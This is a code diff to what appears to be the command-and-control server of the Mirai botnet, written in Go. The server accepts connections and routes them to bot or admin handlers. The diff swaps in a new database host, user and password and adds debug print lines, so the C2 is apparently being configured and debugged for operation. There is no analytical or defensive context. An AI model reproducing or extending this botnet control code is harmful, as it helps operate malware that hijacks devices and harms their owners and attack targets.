@@ -7,9 +7,9 @@ import (
     "time"
 )
 
-const DatabaseAddr string   = "127.0.0.1"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabaseAddr string   = "10.5.0.4"
+const DatabaseUser string   = "shift"
+const DatabasePass string   = "pwd"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
@@ -43,6 +43,7 @@ func main() {
         if err != nil {
             break
         }
+        fmt.Println("Conn accepted")
         go initialHandler(conn)
     }
 
@@ -59,7 +60,7 @@ func initialHandler(conn net.Conn) {
     if err != nil || l <= 0 {
         return
     }
-
+    fmt.Println("initialHandler buf:", buf, "l:", l)
     if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
         if buf[3] > 0 {
             string_len := make([]byte, 1)
@@ -83,6 +84,7 @@ func initialHandler(conn net.Conn) {
     } else {
         NewAdmin(conn).Handle()
     }
+    fmt.Println("initialHandler ended")
 }
 
 func apiHandler(conn net.Conn) {
